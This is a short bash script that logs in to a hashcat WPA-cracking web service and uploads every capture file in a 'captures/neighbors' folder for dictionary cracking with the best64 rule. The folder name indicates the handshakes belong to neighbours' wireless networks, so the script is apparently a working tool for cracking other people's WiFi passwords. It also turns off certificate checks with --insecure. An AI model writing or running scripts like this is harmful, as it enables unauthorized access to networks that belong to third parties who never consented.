#!/usr/bin/env bash

HASHCAT_WPA_URL="http://192.168.1.100:8000"
token=`curl --insecure -d ${HASHCAT_USERNAME}:${HASHCAT_PASSWORD} ${HASHCAT_WPA_URL}/auth | jq -r '.access_token'`

for cap in captures/neighbors/*.cap; do
    echo "Cracking $cap"
    curl --insecure -H "Authorization: JWT $token" \
                    -H "filename: ${cap}" \
                    -H "timeout: 360" \
                    -H "wordlist: $1" \
                    -H "rule: best64.rule" \
                    --data-binary "@${cap}" ${HASHCAT_WPA_URL}/upload
done